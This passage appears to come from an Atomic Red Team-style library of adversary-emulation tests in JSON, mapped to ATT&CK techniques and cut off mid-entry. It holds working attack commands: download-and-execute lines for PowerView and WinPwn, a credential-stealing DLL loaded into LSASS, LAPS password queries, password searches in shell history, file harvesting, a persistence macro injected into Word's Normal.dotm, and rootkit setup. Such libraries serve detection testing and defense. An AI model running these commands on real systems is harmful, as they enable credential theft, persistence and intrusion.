		"auto_generated_guid": "46f8dbe9-22a5-4770-8513-66119c5be63b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domain": {
				"description": "Domain FQDN",
				"type": "string",
				"default": "$env:UserDnsDomain"
			},
			"uac_prop": {
				"description": "UAC Property to search",
				"type": "integer",
				"default": 524288
			}
		},
		"dependencies": [
			{
				"description": "PowerShell ActiveDirectory Module must be installed\n",
				"prereq_command": "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n}\nCatch {\n    exit 1\n}\n",
				"get_prereq_command": "if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}\n"
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Get-DomainUser with PowerView",
		"auto_generated_guid": "93662494-5ed7-4454-a04c-8c8372808ac2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Active Directory Users with ADSISearcher",
		"auto_generated_guid": "02e8be5a-3065-4e54-8cc8-a14d138834d3",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()\n"
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Linked Policies In ADSISearcher Discovery",
		"auto_generated_guid": "7ab0205a-34e4-4a44-9b04-e1541d1a57be",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n"
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Root Domain linked policies Discovery",
		"auto_generated_guid": "00c652e2-0750-4ca6-82ff-0204684a6fe4",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n"
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - generaldomaininfo",
		"auto_generated_guid": "ce483c35-c74b-45a7-a670-631d1e69db3d",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Kerbrute - userenum",
		"auto_generated_guid": "f450461c-18d1-4452-9f0d-2c42c3f08624",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"Domain": {
				"description": "Domain that is being tested against",
				"type": "string",
				"default": "$env:USERDOMAIN"
			},
			"DomainController": {
				"description": "Domain Controller that is being tested against",
				"type": "string",
				"default": "$env:UserDnsDomain"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"
			},
			{
				"description": "username text file must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"\n"
			}
		],
		"executor": {
			"command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Wevtutil - Discover NTLM Users Remote",
		"auto_generated_guid": "b8a563d4-a836-4993-a74e-0a19b8481bfe",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$target = $env:LOGONSERVER\n$target = $target.Trim(\"\\\\\")\n$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString\nwmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\\"Event[System[(EventID=4776)]]\"'",
			"cleanup_command": "Remove-Item -Path \\\\$IpAddress\\c$\\ntlmusers.evtx\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Suspicious LAPS Attributes Query with Get-ADComputer all properties",
		"auto_generated_guid": "394012d9-2164-4d4f-b9e5-acf30ba933fe",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"hostname": {
				"description": "Name of the host",
				"type": "string",
				"default": "$env:computername"
			}
		},
		"executor": {
			"command": "Get-ADComputer #{hostname} -Properties *",
			"cleanup_command": null,
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property",
		"auto_generated_guid": "6e85bdf9-7bc4-4259-ac0f-f0cb39964443",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"hostname": {
				"description": "Name of the host",
				"type": "string",
				"default": "$env:computername"
			}
		},
		"executor": {
			"command": "Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime",
			"cleanup_command": null,
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope",
		"auto_generated_guid": "ffbcfd62-15d6-4989-a21a-80bfc8e58bb5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-adcomputer -SearchScope subtree -filter \"name -like '*'\" -Properties *",
			"cleanup_command": null,
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Suspicious LAPS Attributes Query with adfind all properties",
		"auto_generated_guid": "abf00f6c-9983-4d9a-afbc-6b1c6c6448e1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"optional_args": {
				"description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
				"type": "string",
				"default": null
			},
			"domain": {
				"description": "Domain of the host",
				"type": "string",
				"default": "$env:USERDOMAIN"
			}
		},
		"executor": {
			"command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" *\n",
			"cleanup_command": null,
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd",
		"auto_generated_guid": "51a98f96-0269-4e09-a10f-e307779a8b05",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"optional_args": {
				"description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
				"type": "string",
				"default": null
			},
			"domain": {
				"description": "Domain of the host",
				"type": "string",
				"default": "$env:USERDOMAIN"
			}
		},
		"executor": {
			"command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime\n",
			"cleanup_command": null,
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Active Directory Domain Search",
		"auto_generated_guid": "096b6d2a-b63f-4100-8fa0-525da4cd25ca",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"domain": {
				"description": "The domain to be tested",
				"type": "string",
				"default": "example"
			},
			"top_level_domain": {
				"description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
				"type": "string",
				"default": "test"
			},
			"user": {
				"description": "username@domain of a user within the ad database",
				"type": "string",
				"default": "user@example.test"
			},
			"password": {
				"description": "password of the user with admin privileges referenced in admin_user",
				"type": "string",
				"default": "s3CurePssw0rD!"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch\n",
				"prereq_command": "which ldapsearch\n",
				"get_prereq_command": "echo ldapsearch not found\n"
			}
		],
		"executor": {
			"elevation_required": false,
			"command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" -s sub -a always -z 1000 dn\n",
			"name": "sh"
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Account Enumeration with LDAPDomainDump",
		"auto_generated_guid": "a54d497e-8dbe-4558-9895-44944baa395f",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"username": {
				"description": "Username and domain to authenticate with",
				"type": "string",
				"default": "domain\\user"
			},
			"target_ip": {
				"description": "IP to connect to",
				"type": "string",
				"default": "127.0.0.1"
			},
			"password": {
				"description": "Password to authenticate with",
				"type": "string",
				"default": "password"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Python3 must be installed",
				"prereq_command": "if [ -x \"$(command -v python3 --version)\" ]; then exit 0; else exit 1; fi;",
				"get_prereq_command": "sudo apt-get -y install python3"
			},
			{
				"description": "Pip must be installed",
				"prereq_command": "if [ -x \"$(command -v pip --version)\" ]; then exit 0; else exit 1; fi;",
				"get_prereq_command": "wget -O /tmp/get-pip.py https://bootstrap.pypa.io/pip/3.6/get-pip.py\npython3 /tmp/get-pip.py"
			},
			{
				"description": "The ldapdomaindump module must be installed",
				"prereq_command": "python3 -c 'import ldapdomaindump' 2>/dev/null",
				"get_prereq_command": "pip install ldapdomaindump"
			},
			{
				"description": "The future module must be installed",
				"prereq_command": "python3 -c 'import future' 2>/dev/null",
				"get_prereq_command": "pip install future"
			}
		],
		"executor": {
			"command": "ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/T1087",
			"cleanup_command": "rm -rf /tmp/T1087/ 2>/dev/null \n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1087.002",
		"phases": ["discovery"]
	},
	{
		"name": "Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa Security Support Provider configuration in registry",
		"auto_generated_guid": "afdfd7e3-8a0b-409f-85f7-886fdf249c9e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old' -Value \"$oldvalue\";\n$newvalue = \"AtomicTest.dll\";\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $newvalue\n",
			"cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');\nSet-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old';",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.005",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig Security Support Provider configuration in registry",
		"auto_generated_guid": "de3f8e74-3351-4fdb-a442-265dbf231738",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old' -Value \"$oldvalue\";\n$newvalue = \"AtomicTest.dll\";\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value $newvalue\n",
			"cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');\nSet-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old';",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.005",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt",
		"auto_generated_guid": "8ecef16d-d289-46b4-917b-0dba6dc81cf1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_path": {
				"description": "Module to be loaded into LSASS",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "lsass_lib.dll must exist on disk at specified location (#{dll_path})\n",
				"prereq_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll\" -UseBasicParsing -OutFile \"#{dll_path}\"\n"
			}
		],
		"executor": {
			"command": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"#{dll_path}\"\n",
			"cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\" -Name \"LsaDbExtPt\" -ErrorAction Ignore | Out-Null\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.008",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Automated Collection Command Prompt",
		"auto_generated_guid": "cb379146-53f1-43e0-b884-7ce2c635ff5b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1\ndir c: /b /s .docx | findstr /e .docx\nfor /R c:\\ %f in (*.docx) do copy /Y %f %temp%\\T1119_command_prompt_collection\n",
			"cleanup_command": "del %temp%\\T1119_command_prompt_collection /F /Q >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1119",
		"phases": ["collection"]
	},
	{
		"name": "Automated Collection PowerShell",
		"auto_generated_guid": "634bd9b9-dc83-4229-b19f-7f83ba9ad313",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null\nGet-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}\n",
			"cleanup_command": "Remove-Item $env:TEMP\\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1119",
		"phases": ["collection"]
	},
	{
		"name": "Recon information for export with PowerShell",
		"auto_generated_guid": "c3f6d794-50dd-482f-b640-0384fbb7db26",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n",
			"cleanup_command": "Remove-Item $env:TEMP\\T1119_1.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_2.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_3.txt -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1119",
		"phases": ["collection"]
	},
	{
		"name": "Recon information for export with Command Prompt",
		"auto_generated_guid": "aa1180e2-f329-4e1e-8625-2472ec0bfaf3",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt\n",
			"cleanup_command": "del %TEMP%\\T1119_1.txt >nul 2>&1\ndel %TEMP%\\T1119_2.txt >nul 2>&1\ndel %TEMP%\\T1119_3.txt >nul 2>&1\ndel %TEMP%\\T1119_4.txt >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1119",
		"phases": ["collection"]
	},
	{
		"name": "AWS - Retrieve EC2 Password Data using stratus",
		"auto_generated_guid": "a21118de-b11e-4ebd-b655-42f11142df0c",
		"supported_platforms": ["linux", "macos", "iaas:aws"],
		"input_arguments": {
			"stratus_path": {
				"description": "Path of stratus binary",
				"type": "path",
				"default": "$PathToAtomicsFolder/T1552/src"
			},
			"aws_region": {
				"description": "AWS region to detonate",
				"type": "string",
				"default": "us-west-2"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
				"prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
			},
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
				"get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
			}
		],
		"executor": {
			"command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force\n",
			"cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1552",
		"phases": ["credential-access"]
	},
	{
		"name": "Search for Passwords in Powershell History",
		"auto_generated_guid": "f9c3d0ab-479b-4019-945f-22ace2b1731a",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "ls -R C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | Select-String \"password\", \"-p\", \"key\", \"pwd\", \"pass\"\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1552",
		"phases": ["credential-access"]
	},
	{
		"name": "Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell",
		"auto_generated_guid": "940db09e-80b6-4dd0-8d4d-7764f89b47a8",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "Microsoft Word must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData = \"1\"\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Get the value of the Key/Value pair\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\n# Logical operation to: if the value of the key/value is 1, do nothing - \n# if the value is 0, change it to 1 and create flag1 - \n# if it doesn't exist, create the value and flag2\nif ($value -eq \"1\") \n{\n  Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\n}   \n  elseif ($value -eq \"0\") \n{\n  Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag1\" > $flagPath1\n} \n  else \n{\n  Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag2\" > $flagPath2\n}\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Create copy of orginal template for restoral\nCopy-Item -Path $docPath -Destination $copyPath -Force\n# VBA code to be insterted as a Macro\n# Will create a scheduled task to open the Calculator at 8:04pm daily\n$vbaCode = @\"\n  Sub AutoExec()\n  Dim applicationPath As String\n  Dim taskName As String\n  Dim runTime As String\n  Dim schTasksCmd As String\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\n  taskName = \"OpenCalcTask\"\n  runTime = \"20:04\"\n  schTasksCmd = \"schtasks /create /tn \"\"\" & taskName & \"\"\" /tr \"\"\" & applicationPath & \"\"\" /sc daily /st \" & runTime & \" /f\"\n  Shell \"cmd.exe /c \" & schTasksCmd, vbNormalFocus\n  End Sub\n\"@\n# Create a new instance of Word.Application\n$word = New-Object -ComObject Word.Application\n# Keep the Word application hidden\n$word.Visible = $false\n# Open the document\n$document = $word.Documents.Open($docPath)\n# Access the VBA project of the document\n$vbaProject = $document.VBProject\n# Add a new module to the VBA project\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\n# Add the VBA code to the new module\n$newModule.CodeModule.AddFromString($vbaCode)\n# Run the Macro\n$word.run(\"AutoExec\")\n# Save and close the document\n$document.SaveAs($docPath)\n$document.Close()\n# Quit Word\n$word.Quit()\n# Release COM objects\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null\n",
			"cleanup_command": "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData1 = \"1\"\n$registryData0 = \"0\"\n# Defines the path each flag file created depending on the original registry state\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Delete the scheduled task created by the Macro\nschtasks /Delete /TN \"OpenCalcTask\" /F | Out-Null\n#Restore the orginal template if the backup copy exists\nif (Test-Path $copyPath)\n{\n  #Delete the injected template\n  Remove-Item -Force $docPath -ErrorAction SilentlyContinue\n  # Restore the original template\n  Rename-Item -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue\n  Write-Host \"The original template has been restored\"\n}\n  else\n{\n  Write-Host \"The original template is present\"\n}\n#Restore the original state of the registry key\nif (Test-Path $flagPath1) \n{\n  # The value was originally 0, set back to 0\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0 -PropertyType DWORD -Force | Out-Null\n  Remove-Item -Force $flagPath1 -ErrorAction SilentlyContinue\n  Write-Host \"The original registry state has been restored\"\n} \n  elseif (Test-Path $flagPath2)\n{\n  #The value did not previously exist, delete the value\n  Remove-ItemProperty -Path $registryKey -Name $registryValue | Out-Null\n  Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue | Out-Null\n  Write-Host \"The original registry state has been restored\"\n}\n  else \n{\n  # The value was already 1, do nothing\n  Write-Host \"The value $registryValue already existed in $registryKey.\"\n}\n"
		},
		"attack_technique": "T1137.001",
		"phases": ["persistence"]
	},
	{
		"name": "Loadable Kernel Module based Rootkit",
		"auto_generated_guid": "dfb50072-e45a-4c75-a17e-a484809c8553",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"rootkit_source_path": {
				"description": "Path to the rootkit source. Used when prerequisites are fetched.",
				"type": "path",
				"default": "PathToAtomicsFolder/T1014/src/Linux"
			},
			"rootkit_path": {
				"description": "Path To rootkit",
				"type": "string",
				"default": "PathToAtomicsFolder/T1014/bin"
			},
			"rootkit_name": {
				"description": "Module name",
				"type": "string",
				"default": "T1014"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)\n",
				"prereq_command": "if [ -f #{rootkit_path}/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "sudo apt install make\nsudo apt install gcc\nif [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; fi;\ncp #{rootkit_source_path}/* /tmp/T1014/\ncd /tmp/T1014; make\nmkdir #{rootkit_path}\nmv /tmp/T1014/#{rootkit_name}.ko #{rootkit_path}/#{rootkit_name}.ko\nrm -rf /tmp/T1014\n"
			}
		],
		"executor": {
